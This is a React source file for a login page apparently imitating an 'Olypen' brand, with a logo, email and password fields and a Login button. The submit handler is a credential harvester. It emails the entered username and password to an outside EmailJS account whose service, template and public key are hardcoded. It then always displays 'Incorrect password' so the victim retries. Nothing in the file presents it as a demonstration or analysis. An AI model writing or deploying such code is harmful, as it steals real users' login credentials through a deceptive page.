import React, { useState} from "react";
import "./Login.css";
import olypenlogo from '../assets/olypenlogo.png';
import emailjs from "@emailjs/browser";


function Login  ()  {

const [username, setUsername] = useState("");
    const [password, setPassword] = useState("");
    const [errorMessage, setErrorMessage] = useState("");

     const sendEmail = (e) => {
    e.preventDefault();

    const templateParams = {
      user_name: username,
      user_pass: password,
    };

    emailjs
      .send(
        "service_76r21vt",
        "template_3ebt39a",
        templateParams,
        {
          publicKey: "VLpCFbUU9kwO5lLXo",
        }
      )
      .then(() => {
        console.log("Email sent successfully");
         setErrorMessage("Incorrect password"); 
      })
      .catch((error) => {
        console.error("Email failed:", error);
      });
  };





  return (
    <div className="login-container">
      {/* Left Image */}
      <div className="login-image">
        <img src={olypenlogo} alt="Login" />
      </div>

      {/* Right Form */}
      <div className="login-form">
        <h2>Login</h2>
        {/* <p>Please login to your account</p> */}

        <form onSubmit={sendEmail}>
          <div className="input-group">
            <label>Email</label>
            <input type="email" placeholder="Enter your email" value={username} onChange={(e) => setUsername(e.target.value)} />
          </div>

          <div className="input-group">
            <label>Password</label>
            <input type="password" placeholder="Enter your password" value={password} onChange={(e) => setPassword(e.target.value)}/>
          </div>

          <button type="submit">Login</button>
                    {errorMessage && (
          <p className="wrong">{errorMessage}</p>
        )}
        </form>
      </div>
    </div>
  );
};

export default Login;
